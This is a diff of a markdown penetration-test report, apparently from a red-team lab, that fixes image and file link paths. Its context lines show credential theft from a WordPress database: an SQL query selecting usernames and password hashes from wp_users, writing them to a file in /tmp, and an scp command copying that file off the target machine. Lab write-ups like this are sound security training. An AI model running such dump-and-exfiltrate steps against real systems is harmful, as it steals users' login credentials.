@@ -129,7 +129,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
        - Examined relevant wp_users contents:  
           `select user_login, user_pass from wp_users;`
           ![Target1/wp_users_schema_and_contents.JPG](Target1/wp_users_schema_and_contents.JPG)
-       - Exfiltrated table contents:
+       - Exfiltrated table contents: [wp_users.csv](Target1/wp_users.csv)
           ```
           select user_login, user_pass from wp_users
           INTO OUTFILE '/tmp/wp_users.csv'
@@ -144,4 +144,4 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
           exit
           scp michael@192.168.1.110:/tmp/wp_users.csv .
           ```
-          ![Target1/wp_users_exfiltration.JPG](wp_users_exfiltration.JPG)
+          ![Target1/wp_users_exfiltration.JPG](Target1/wp_users_exfiltration.JPG)
